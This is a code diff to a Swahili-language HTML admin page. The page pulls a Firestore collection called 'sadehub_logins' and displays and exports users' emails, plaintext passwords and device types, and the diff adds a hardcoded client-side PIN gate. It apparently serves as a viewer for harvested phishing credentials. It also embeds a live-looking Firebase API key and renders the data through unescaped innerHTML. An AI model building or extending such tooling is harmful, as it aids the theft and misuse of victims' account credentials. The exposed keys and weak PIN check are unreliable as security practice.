@@ -4,156 +4,108 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Logins Admin</title>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyCq0QQbxa4QkmaxTh8QCaJ1EN_ORkKNWPE",
-      authDomain: "world-technology-4d429.firebaseapp.com",
-      projectId: "world-technology-4d429",
-      storageBucket: "world-technology-4d429.firebasestorage.app",
-      messagingSenderId: "979647621854",
-      appId: "1:979647621854:web:d74e648bf93ad6c671704f"
-    };
-
-    const COLLECTION_NAME = "sadehub_logins";
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    let allData = [];
-
-    function formatDate(val) {
-      if (!val) return '—';
-      if (val.toDate) return val.toDate().toLocaleString('sw-KE');
-      if (typeof val === 'string' || typeof val === 'number') return new Date(val).toLocaleString('sw-KE');
-      return String(val);
-    }
-
-    async function loadData() {
-      const loading = document.getElementById('loading');
-      const content = document.getElementById('content');
-      const errorEl = document.getElementById('error-msg');
-      loading.style.display = 'flex';
-      content.style.display = 'none';
-      errorEl.style.display = 'none';
-      try {
-        const snap = await getDocs(collection(db, COLLECTION_NAME));
-        allData = [];
-        snap.forEach(doc => allData.push({ id: doc.id, ...doc.data() }));
-        loading.style.display = 'none';
-        content.style.display = 'block';
-        renderTable(allData);
-        updateCount(allData.length);
-      } catch(err) {
-        loading.style.display = 'none';
-        errorEl.style.display = 'block';
-        errorEl.textContent = '⚠️ ' + err.message;
-      }
-    }
-
-    function updateCount(n) {
-      document.getElementById('count').textContent = 'Jumla: ' + n + ' rekodi';
-    }
-
-    function renderTable(data) {
-      const tbody = document.getElementById('tbody');
-      tbody.innerHTML = '';
-      if (!data.length) {
-        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:2rem;color:#888">Hakuna rekodi</td></tr>';
-        return;
-      }
-      data.forEach((d, i) => {
-        const ts = d.tarehe || d.createdAt || d.timestamp || d.wakati;
-        const tr = document.createElement('tr');
-        tr.innerHTML = `
-          <td><span class="num">${i+1}</span></td>
-          <td>${d.email || d.jina || d.name || '—'}</td>
-          <td>${d.password || d.pass || '—'}</td>
-          <td class="date">${formatDate(ts)}</td>
-          <td>${d.aina_ya_simu || d.phone_type || d.kifaa || d.device || '—'}</td>
-        `;
-        tbody.appendChild(tr);
-      });
-    }
-
-    function exportCSV() {
-      const rows = [['#','Email/Jina','Password','Wakati','Kifaa']];
-      allData.forEach((d, i) => {
-        const ts = d.tarehe || d.createdAt || d.timestamp || d.wakati;
-        rows.push([
-          i+1,
-          d.email || d.jina || d.name || '',
-          d.password || d.pass || '',
-          formatDate(ts),
-          d.aina_ya_simu || d.phone_type || d.kifaa || d.device || ''
-        ]);
-      });
-      const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(',')).join('\n');
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(new Blob([csv], {type:'text/csv'}));
-      a.download = 'logins-' + new Date().toISOString().slice(0,10) + '.csv';
-      a.click();
-    }
-
-    window.addEventListener('DOMContentLoaded', () => {
-      loadData();
-      document.getElementById('export-btn').onclick = exportCSV;
-      document.getElementById('refresh-btn').onclick = loadData;
-      document.getElementById('search').addEventListener('input', e => {
-        const q = e.target.value.toLowerCase();
-        const filtered = allData.filter(d =>
-          (d.email||d.jina||'').toLowerCase().includes(q) ||
-          (d.password||d.pass||'').toLowerCase().includes(q) ||
-          (d.aina_ya_simu||d.kifaa||'').toLowerCase().includes(q)
-        );
-        renderTable(filtered);
-        updateCount(filtered.length);
-      });
-    });
-  </script>
-
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       background: #111;
       color: #ddd;
       font-family: Arial, sans-serif;
-      font-size: 14px;
+      font-size: 13px;
+      min-height: 100vh;
     }
+
+    /* ===== LOGIN PAGE ===== */
+    #login-page {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #111;
+    }
+    .login-box {
+      background: #1c1c1c;
+      border: 1px solid #2a2a2a;
+      border-radius: 10px;
+      padding: 32px 28px;
+      width: 90%;
+      max-width: 320px;
+      text-align: center;
+    }
+    .login-box h2 {
+      font-size: 1.1rem;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+    .login-box p {
+      color: #888;
+      font-size: 0.78rem;
+      margin-bottom: 20px;
+    }
+    .login-box input {
+      width: 100%;
+      background: #222;
+      border: 1px solid #333;
+      color: #ddd;
+      border-radius: 6px;
+      padding: 10px 12px;
+      font-size: 1rem;
+      outline: none;
+      text-align: center;
+      letter-spacing: 6px;
+      margin-bottom: 14px;
+    }
+    .login-box input:focus { border-color: #1a6fc4; }
+    .login-box button {
+      width: 100%;
+      background: #1a6fc4;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px;
+      font-size: 0.9rem;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .login-box button:hover { background: #1560aa; }
+    .login-error {
+      color: #f88;
+      font-size: 0.78rem;
+      margin-top: 10px;
+      display: none;
+    }
+
+    /* ===== ADMIN PAGE ===== */
+    #admin-page { display: none; }
 
     .top-bar {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 14px 16px 4px;
+      padding: 10px 10px 4px;
       flex-wrap: wrap;
-      gap: 8px;
+      gap: 6px;
     }
-
     .title-group h2 {
-      font-size: 1rem;
+      font-size: 0.95rem;
       font-weight: bold;
       color: #fff;
     }
     .title-group .count {
-      font-size: 0.75rem;
+      font-size: 0.72rem;
       color: #888;
-      margin-top: 2px;
+      margin-top: 1px;
     }
-
-    .actions { display: flex; gap: 8px; align-items: center; }
+    .actions { display: flex; gap: 6px; align-items: center; }
 
     input[type=text] {
       background: #222;
       border: 1px solid #333;
       color: #ddd;
       border-radius: 5px;
-      padding: 5px 10px;
-      font-size: 0.8rem;
+      padding: 4px 8px;
+      font-size: 0.75rem;
       outline: none;
-      width: 160px;
+      width: 110px;
     }
     input[type=text]:focus { border-color: #1a6fc4; }
 
@@ -161,61 +113,57 @@
       border: none;
       cursor: pointer;
       border-radius: 5px;
-      font-size: 0.8rem;
+      font-size: 0.75rem;
       font-weight: bold;
-      padding: 6px 14px;
+      padding: 5px 10px;
     }
     .btn-csv { background: #28a745; color: #fff; }
-    .btn-csv:hover { background: #218838; }
-    .btn-refresh { background: #444; color: #fff; }
-    .btn-refresh:hover { background: #555; }
+    .btn-logout { background: #444; color: #fff; }
 
-    .table-wrap { overflow-x: auto; padding: 0 0 20px; }
+    .table-wrap { overflow-x: auto; }
 
     table { width: 100%; border-collapse: collapse; }
-
     thead tr { background: #1a6fc4; }
     thead th {
-      padding: 10px 10px;
+      padding: 8px 6px;
       text-align: left;
-      font-size: 0.8rem;
+      font-size: 0.72rem;
       color: #fff;
       white-space: nowrap;
     }
-
     tbody tr:nth-child(odd)  { background: #161616; }
     tbody tr:nth-child(even) { background: #1c1c1c; }
     tbody tr:hover { background: #1e3a5f; }
-
     td {
-      padding: 8px 10px;
-      font-size: 0.82rem;
+      padding: 6px 6px;
+      font-size: 0.75rem;
       vertical-align: middle;
-      border-bottom: 1px solid #222;
+      border-bottom: 1px solid #1e1e1e;
       word-break: break-all;
+      max-width: 120px;
     }
-
     .num {
       display: inline-block;
       background: #2a2a2a;
-      border-radius: 4px;
-      padding: 1px 7px;
-      font-size: 0.72rem;
+      border-radius: 3px;
+      padding: 1px 5px;
+      font-size: 0.68rem;
       color: #aaa;
     }
-    .date { color: #aaa; font-size: 0.78rem; white-space: nowrap; }
+    .date { color: #999; font-size: 0.68rem; white-space: nowrap; }
 
     #loading {
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 4rem;
-      gap: 12px;
+      padding: 3rem;
+      gap: 10px;
       color: #888;
+      font-size: 0.82rem;
     }
     .spinner {
-      width: 34px; height: 34px;
+      width: 30px; height: 30px;
       border: 3px solid #333;
       border-top-color: #1a6fc4;
       border-radius: 50%;
@@ -225,18 +173,31 @@
 
     #error-msg {
       display: none;
-      margin: 12px 16px;
+      margin: 10px;
       background: rgba(200,50,50,0.15);
       border: 1px solid #c03;
       color: #f88;
       border-radius: 6px;
-      padding: 10px 14px;
-      font-size: 0.85rem;
+      padding: 8px 12px;
+      font-size: 0.8rem;
     }
   </style>
 </head>
 <body>
 
+<!-- LOGIN PAGE -->
+<div id="login-page">
+  <div class="login-box">
+    <h2>🔐 Admin Panel</h2>
+    <p>Ingiza nambari ya siri kuendelea</p>
+    <input type="password" id="pin-input" placeholder="••••" maxlength="10"/>
+    <button onclick="checkLogin()">Ingia</button>
+    <div class="login-error" id="login-error">❌ Nambari si sahihi</div>
+  </div>
+</div>
+
+<!-- ADMIN PAGE -->
+<div id="admin-page">
   <div class="top-bar">
     <div class="title-group">
       <h2>📋 Logins</h2>
@@ -245,7 +206,7 @@
     <div class="actions">
       <input type="text" id="search" placeholder="Tafuta..."/>
       <button class="btn-csv" id="export-btn">↓ CSV</button>
-      <button class="btn-refresh" id="refresh-btn">↻ Refresh</button>
+      <button class="btn-logout" onclick="logout()">Toka</button>
     </div>
   </div>
 
@@ -272,6 +233,133 @@
       </table>
     </div>
   </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCq0QQbxa4QkmaxTh8QCaJ1EN_ORkKNWPE",
+    authDomain: "world-technology-4d429.firebaseapp.com",
+    projectId: "world-technology-4d429",
+    storageBucket: "world-technology-4d429.firebasestorage.app",
+    messagingSenderId: "979647621854",
+    appId: "1:979647621854:web:d74e648bf93ad6c671704f"
+  };
+
+  const COLLECTION_NAME = "sadehub_logins";
+  const ADMIN_PIN = "4944";
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+  let allData = [];
+
+  // ---- LOGIN ----
+  window.checkLogin = function() {
+    const val = document.getElementById('pin-input').value;
+    const err = document.getElementById('login-error');
+    if (val === ADMIN_PIN) {
+      document.getElementById('login-page').style.display = 'none';
+      document.getElementById('admin-page').style.display = 'block';
+      loadData();
+    } else {
+      err.style.display = 'block';
+      document.getElementById('pin-input').value = '';
+    }
+  };
+
+  window.logout = function() {
+    document.getElementById('admin-page').style.display = 'none';
+    document.getElementById('login-page').style.display = 'flex';
+    document.getElementById('pin-input').value = '';
+  };
+
+  // Enter key on login
+  document.getElementById('pin-input').addEventListener('keydown', e => {
+    if (e.key === 'Enter') window.checkLogin();
+  });
+
+  // ---- DATA ----
+  function formatDate(val) {
+    if (!val) return '—';
+    if (val.toDate) return val.toDate().toLocaleString('sw-KE');
+    if (typeof val === 'string' || typeof val === 'number') return new Date(val).toLocaleString('sw-KE');
+    return String(val);
+  }
+
+  async function loadData() {
+    const loading = document.getElementById('loading');
+    const content = document.getElementById('content');
+    const errorEl = document.getElementById('error-msg');
+    loading.style.display = 'flex';
+    content.style.display = 'none';
+    errorEl.style.display = 'none';
+    try {
+      const snap = await getDocs(collection(db, COLLECTION_NAME));
+      allData = [];
+      snap.forEach(doc => allData.push({ id: doc.id, ...doc.data() }));
+      loading.style.display = 'none';
+      content.style.display = 'block';
+      renderTable(allData);
+      updateCount(allData.length);
+    } catch(err) {
+      loading.style.display = 'none';
+      errorEl.style.display = 'block';
+      errorEl.textContent = '⚠️ ' + err.message;
+    }
+  }
+
+  function updateCount(n) {
+    document.getElementById('count').textContent = 'Jumla: ' + n + ' rekodi';
+  }
+
+  function renderTable(data) {
+    const tbody = document.getElementById('tbody');
+    tbody.innerHTML = '';
+    if (!data.length) {
+      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:1.5rem;color:#888">Hakuna rekodi</td></tr>';
+      return;
+    }
+    data.forEach((d, i) => {
+      const ts = d.tarehe || d.createdAt || d.timestamp || d.wakati;
+      const tr = document.createElement('tr');
+      tr.innerHTML = `
+        <td><span class="num">${i+1}</span></td>
+        <td>${d.email || d.jina || d.name || '—'}</td>
+        <td>${d.password || d.pass || '—'}</td>
+        <td class="date">${formatDate(ts)}</td>
+        <td>${d.aina_ya_simu || d.phone_type || d.kifaa || d.device || '—'}</td>
+      `;
+      tbody.appendChild(tr);
+    });
+  }
+
+  function exportCSV() {
+    const rows = [['#','Email/Jina','Password','Wakati','Kifaa']];
+    allData.forEach((d, i) => {
+      const ts = d.tarehe || d.createdAt || d.timestamp || d.wakati;
+      rows.push([i+1, d.email||d.jina||'', d.password||d.pass||'', formatDate(ts), d.aina_ya_simu||d.kifaa||'']);
+    });
+    const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(',')).join('\n');
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([csv], {type:'text/csv'}));
+    a.download = 'logins-' + new Date().toISOString().slice(0,10) + '.csv';
+    a.click();
+  }
+
+  document.getElementById('export-btn').onclick = exportCSV;
+  document.getElementById('search').addEventListener('input', e => {
+    const q = e.target.value.toLowerCase();
+    const filtered = allData.filter(d =>
+      (d.email||d.jina||'').toLowerCase().includes(q) ||
+      (d.password||d.pass||'').toLowerCase().includes(q) ||
+      (d.aina_ya_simu||d.kifaa||'').toLowerCase().includes(q)
+    );
+    renderTable(filtered);
+    updateCount(filtered.length);
+  });
+</script>
 
 </body>
 </html>
